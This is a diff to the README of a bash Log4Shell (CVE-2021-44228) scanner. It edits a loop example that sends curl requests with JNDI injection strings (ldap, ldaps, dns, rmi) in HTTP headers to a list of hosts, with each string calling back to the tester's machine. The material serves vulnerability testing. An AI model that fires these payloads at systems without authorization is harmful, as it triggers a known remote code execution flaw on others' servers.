@@ -1,7 +1,7 @@
 # log4jScanner
 
  log4jScanner.sh is a BASH script to confirm the vulnerability (CVE-2021-44228) of a given IP/URL.
- 
+ This script validates the return traffic on 4 protocols ldap | ldaps | rmi | dns 
  The testing methedology is completely noninvasive. 
  
 ## Requirements
@@ -37,7 +37,7 @@ git clone https://github.com/defcon250/log4jScanner
 ## For testing multiple IP/URLs, please feel free to modify the script accordingly.
 ```bash
 FOR loop example: 
-for i in $(cat "$VAR001"); do timeout 2 curl -ksqL http://"$i" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$VAR001" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; done
+for i in $(cat /tmp/urls.txt); do timeout 2 curl -ksqL http://"$i" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; done
 ````
 
 
